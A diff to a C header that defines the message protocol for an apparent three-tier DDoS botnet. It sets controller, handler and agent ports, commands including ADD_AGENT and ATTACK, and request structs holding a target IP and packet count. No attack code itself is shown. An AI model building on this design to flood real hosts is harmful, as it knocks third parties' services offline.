@@ -1,10 +1,47 @@
 #ifndef DDOS_H
 #define DDOS_H
 
-enum
-{
-    DDNS_CMD_INTERROGATE = 1,
+#include <arpa/inet.h>
 
-}ddns_cmd_t;
+/* Ports */
+#define DDOS_CTRL_CLT_PORT 2000
+
+#define DDOS_HANDL_CLT_PORT 3000
+#define DDOS_HANDL_SRV_PORT 4000
+
+#define DDOS_AGENT_SRV_PORT 5000
+
+typedef enum
+{
+    DDOS_CMD_ADD_AGENT = 1,
+    DDOS_CMD_INTERROGATE_HANDLER = 2,
+    DDOS_CMD_INTERROGATE_AGENTS = 3,
+    DDOS_CMD_ATTACK = 4,
+}ddos_cmd_t;
+
+typedef enum
+{
+    DDOS_OK = 1,
+    DDOS_ERROR = 2,
+}ddos_status_t;
+
+typedef struct
+{
+    ddos_cmd_t cmd;
+    char ip[INET_ADDRSTRLEN];
+    int pkts;
+} ddos_request_t;
+
+typedef struct
+{
+    ddos_status_t status;
+    int data;
+} ddos_responce_t;
+
+typedef struct 
+{
+    char *target_ip;
+    int pkts;
+}attack_data_t;
 
 #endif /* DDOS_H */
